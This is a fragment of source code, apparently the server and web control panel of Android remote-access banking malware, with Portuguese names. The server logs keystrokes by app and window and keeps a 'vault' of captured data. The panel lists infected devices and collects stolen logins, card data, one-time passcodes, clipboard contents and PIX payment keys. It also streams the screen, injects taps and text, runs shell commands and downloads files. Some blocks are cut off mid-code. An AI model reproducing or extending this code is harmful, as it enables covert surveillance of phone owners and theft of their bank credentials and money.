                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass

def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass

def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]

function co(){
  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
  w.binaryType='arraybuffer';
  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(sel&&mag&&vNow!=='perfil')c('tree')},2600);
    setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
  w.onmessage=e=>{
    if(typeof e.data!=='string'){frame(e.data);return}
    const m=JSON.parse(e.data);
    if(m.k==='devs'){
      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
      return}
    if(m.k!=='log')return;
    const x=m.d;
    if(x.t==='hello'){inf=x;log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
      if(!sel&&x.id){dev.value=x.id;pick()}}
    else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
    else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
    else if(x.t==='ka'){}
    else if(x.t==='apps'){$('#out2').textContent=x.o}
    else if(x.t==='info'){$('#out3').textContent=x.o}
    else if(x.t==='ls'){lista(x.o)}
    else if(x.t==='dl'){baixa(x.o)}
    else if(x.t==='tree'){nos=x.o||[]}
    else if(x.t==='k'){if(vNow==='tecla'&&!kpause)kcarrega()}
    else if(x.t==='cred'||x.t==='cartao'){cofre.unshift(Object.assign({_t:x.t},x.o));desenhaCofre();toq(x.t+': '+(x.o.campo||''))}
    else if(x.t==='otp'){cofre.unshift({_t:'otp',v:x.o});desenhaCofre();toq('otp recebido')}
    else if(x.t==='clip'){cofre.unshift({_t:'clip',v:x.o});desenhaCofre()}
    else if(x.t==='contas'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='finger'){$('#out4').textContent=x.o;go('recon')}
    else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm){$('#pch').value=mm[1].trim();toq('chave pix capturada')}}
    else if(x.t==='snap')snapShow(x.o||'')
    else log(x.t+': '+(x.o||''))
  };
}

  lf=Date.now();st.textContent='';

function send(){const e=$('#t'),v=e.value;
  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';e.placeholder='texto  |  $comando  |  /ls path  |  /dl path';return}

  else {c('text',{s:v});push({x:v});e.value=''}
}

function pt(e){
  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
  const s=Math.min(r.width/nx,r.height/ny)||1;
  const ox=r.left+(r.width-nx*s)/2,oy=r.top+(r.height-ny*s)/2;
  const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
  const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
  return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}

function baixa(o){
  if(o==='fim'){fechaDl();return}
  const m=o.match(/b64=([\s\S]*)/);if(!m){log(o);return}

  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
  const b=atob(m[1].replace(/\s/g,''));
  for(let x=0;x<b.length;x++)dlBuf.push(b.charCodeAt(x));
  dlOff+=b.length;
  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()}
